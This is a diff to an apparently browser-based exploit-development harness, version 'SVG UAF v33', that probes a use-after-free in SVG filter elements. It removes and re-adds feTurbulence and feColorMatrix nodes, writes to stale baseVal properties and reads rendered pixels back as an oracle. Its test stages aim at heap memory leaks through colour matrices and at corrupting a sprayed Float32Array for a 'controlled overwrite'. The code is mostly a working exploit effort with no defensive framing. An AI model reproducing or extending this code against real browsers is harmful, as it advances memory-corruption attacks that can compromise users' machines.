+    document.body.appendChild(eE.svg); await raf(); await raf();
+
+    var bfAnimE = turbE.baseFrequency;
+    turbE.remove(); await raf();
+    var wroteE = null;
+    try {
+      turbE.baseFrequency.baseVal = 1e38;
+      wroteE = turbE.baseFrequency.baseVal;
+    } catch(e) { wroteE = 'ERR:' + e; }
+    log('  feTurbulence.baseFrequency UAF write=1e38: wrote=' + wroteE, 'inf');
+    eE.filter.appendChild(turbE); await raf(); await raf();
+    var pxE = await readLive(eE.svg);
+    log('  feTurbulence UAF re-add: px=' + (pxE ? pxE.slice(0,3) : 'err'), 'inf');
+    document.body.removeChild(eE.svg);
+  }
+
+  if (!q) dis(false);
+}
+
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v32 - UAF feed verify + type-swap vector mismatch + MXS narrow + combined', 'inf');
+  log('SVG UAF v33 - bypass notifyChange + float16 oracle + type-swap heap + pure corrupt', 'inf');
   sep();
   var tests = [
-    ['UFV_uaf_feed_verify',    runUFV],
-    ['TSV_type_swap_vector',   runTSV],
-    ['MXN_mxs_narrow',        runMXN],
-    ['CMB_combined',           runCMB]
+    ['NCB_notifychange_bypass', runNCB],
+    ['F16_float16_oracle',      runF16],
+    ['TSH_type_swap_heap',      runTSH],
+    ['PRM_pure_mem_corrupt',    runPRM]
   ];
   for (var i = 0; i < tests.length; i++) {
     var lbl = tests[i][0]; var fn = tests[i][1];
     sep(); log(lbl, 'inf'); sep();
     try { await fn(true); }
-    catch(e) { log('[!] ' + lbl + ': threw ' + e, 'bad'); }
+    catch(e) { log('[!] ' + lbl + ' threw: ' + e, 'bad'); }
     log('');
   }
   sep();
-  log('SUMMARY v32', 'inf');
+  log('SUMMARY v33', 'inf');
   sep();
-  log('  UFV: UAF write 2 -> R=255? confirms UAF feeds rasterizer directly', 'inf');
-  log('  TSV: TestC baseVal[1..4] after type-swap -> garbage = heap leak via feColorMatrix?', 'inf');
-  log('  MXN: boundary value in hex -> tells us the internal int width', 'inf');
-  log('  CMB: multi-channel control -> if channels independent, UAF = arbitrary pixel output', 'inf');
+  log('  NCB StratE: plain remove+re-add no write -> if still 0,0,0 -> re-add is the bug', 'inf');
+  log('  NCB StratA: live write=2 -> R=255 expected. if yes: write-before-remove is the fix', 'inf');
+  log('  NCB StratB: UAF write + re-add + setAttribute -> setAttribute rescues render', 'inf');
+  log('  F16: flip boundaries map float16 zones. oracle resolution test', 'inf');
+  log('  TSH: non-zero G/B after type-swap = adjacent heap memory read through matrix', 'inf');
+  log('  PRM: spray corruption = UAF write landed on Float32Array = controlled overwrite', 'inf');
   sep();
   dis(false);
 }
